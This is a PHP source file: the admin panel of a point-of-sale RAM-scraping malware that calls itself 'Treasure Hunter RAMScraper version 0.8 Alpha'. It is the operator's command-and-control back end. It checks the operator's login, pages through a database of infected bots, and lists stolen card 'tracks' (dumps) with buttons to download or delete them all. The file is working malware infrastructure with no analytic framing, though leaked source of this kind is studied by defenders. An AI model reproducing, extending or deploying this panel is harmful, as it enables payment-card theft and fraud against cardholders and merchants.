<?php
require_once("config.php");
require_once("common/commonFunctions.php");
require_once("common/dbOperations.php");

date_default_timezone_set(TIMEZONE);

ini_set("session.cookie_httponly", true);
ini_set("session.use_only_cookies", true);
session_start();

if(isset($_SESSION["loggedIn"]) && $_SESSION["loggedIn"] == "true")
	$loggedIn = true;
else
	$loggedIn = false;

if (isset($_POST["login"]) && isset($_POST["password"])){
	if ($_POST["login"] == LOGIN && sha1($_POST["password"]) == PASSWORD){
		$_SESSION["loggedIn"] = "true";
		$loggedIn = true;
	} else
		$loggedIn = false;
} else if (isset($_POST["logOut"]) && $_POST["logOut"] == "true"){
	session_unset();
	$loggedIn = false;
}
?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		<link rel="shortcut icon" href="images/favicon.ico">
		<title><?php echo ($loggedIn) ? "Welcome to the Treasure Hunter RAMScraper version 0.8 Alpha admin panel" : "Please log in" ?></title>
		<link rel="stylesheet" type="text/css" href="CSS/style.css" media="screen" />
	</head>

	<?php
	$currTime = time();

	if (!$loggedIn){
	?>

	<body>
		<center>
			<h1>Enter username and password</h1>

			<?php
			if (!$loggedIn && (isset($_POST["login"]) || isset($_POST["password"])))
				echo "<p>Incorrect login or password!</p>";
			?>

			<form name="loginForm" action="" method="post">
				<table>
					<tr>
						<td class="loginMenu"><label for="login">Login</label></td>
						<td><input id="login" name="login" type="text"></input></td>
					</tr>
					<tr>
						<td class="loginMenu"><label for="password">Password</label></td>
						<td><input id="password" name="password" type="password"></input></td>
					</tr>
				</table>
				<input class="btn" type="submit" value="Enter">
			</form>
		</center>
	</body>

	<?php
	} else {
	?>

	<body>
		<form id="logOut" name="logOut" action="" method="post">
			<input type="hidden" name="logOut" value="true">
			<table><td class="navBarUnselected"><input class="btn" type="submit" value="Log out"></td></table>
		</form>
		<center>
			<h1 id="adminHead">Treasure Hunter RAMScraper version 0.8 Alpha admin panel</h1>
			<table class="navBar">
				<td class=<?php if (!isset($_GET["dumpslist"])){ ?>"navBarSelected"><a class="navLinkSelected" <?php } else { ?>class="navBarUnselected"><a class="navLinkUnselected" <?php } ?> href="admin.php">Bots list</a></td>
				<td  class=<?php if (isset($_GET["dumpslist"])){ ?>"navBarSelected"><a class="navLinkSelected" <?php } else { ?>class="navBarUnselected"><a class="navLinkUnselected" <?php } ?> href="admin.php?dumpslist">Dumps list</a></td>
			</table>
		</center>
		<br>

		<?php
		$connection = connectToDB(DBSERVER, DBUSER, DBPASSWORD, DATABASE);
		if (!$connection){
		?>

			<h1>Could not connect to database!</h1>

		<?php
			die();
		} else {
			$page = (isset($_GET["page"]) && $_GET["page"]!=0) ? (filterString($_GET["page"])-1)*10 : 0;
			if (!isset($_GET["dumpslist"])){
				$query = executeQuery("SELECT * FROM bots ORDER BY firstActive DESC LIMIT " . (int)$page . ", 10");
				if (is_array($query))
					displayBots($query);
			} else {
		?>

		<center>
			<table class="botsList">
				<tr class="botInfoRow">
					<td class="botInfo">Download all dumps:</td>
					<td class="botInfo">
						<form id="downloadDumps" name="downloadDumps" action="dumpActions.php" method="post" target="_blank">
							<input type="hidden" name="botID" value="all">
							<input type="hidden" name="action" value="download">
							<table><td class="navBarUnselected"><input class="btn" type="submit" value="Download dumps"></td></table>
						</form>
					</td>
				</tr>
				<tr class="botInfoRow">
					<td class="botInfo">Delete all dumps:</td>
					<td class="botInfo">
						<form id="deleteDumps" name="deleteDumps" action="dumpActions.php" method="post">
							<input type="hidden" name="botID" value="all">
							<input type="hidden" name="action" value="delete">
							<table><td class="navBarUnselected"><input class="btn" type="submit" value="Delete dumps"></td></table>
						</form>
					</td>
				</tr>
			</table>
		</center>
		<br>

		<?php
				$query = executeQuery("SELECT * FROM tracks ORDER BY timeRecieved DESC LIMIT " . (int)$page . ", 10");
				if (is_array($query))
					displayDumps($query);
			}
		?>

		<br>
		<center>

			<?php
				if (!isset($_GET["dumpslist"]))
					$query = executeQuery("SELECT count(*) FROM bots");
				else
					$query = executeQuery("SELECT count(*) FROM tracks");
				$count = isset($query[0]["count(*)"]) ? $query[0]["count(*)"] : 0;

				if ($count > 10){
			?>

			<p>Browse <?php if (!isset($_GET["dumpslist"])) echo "bots"; else echo "dumps"; echo " (" . $count . " total)"; ?></p>
			<table class="navBar">

			<?php
					for ($i=0; $i<$count; $i+=10){
						$pageIndex = floor($i/10)+1;
			?>

				<td class="<?php if ((isset($_GET["page"]) && $_GET["page"] == $pageIndex) || (!isset($_GET["page"]) && $pageIndex == 1)){ ?>navBarSelected"><a class="navLinkSelected<?php } else { ?>navBarUnselected"><a class="navLinkUnselected<?php } ?>" href="<?php if (isset($_GET["dumpslist"])) echo "?dumpslist&page="; else echo "?page="; echo $pageIndex; ?>"><?php echo $pageIndex; ?></a></td>

		<?php
					}
		?>

			</table>

		<?php
				}
		?>

		</center>

		<?php
		}
		?>

	</body>

	<?php
	}
	?>

</html>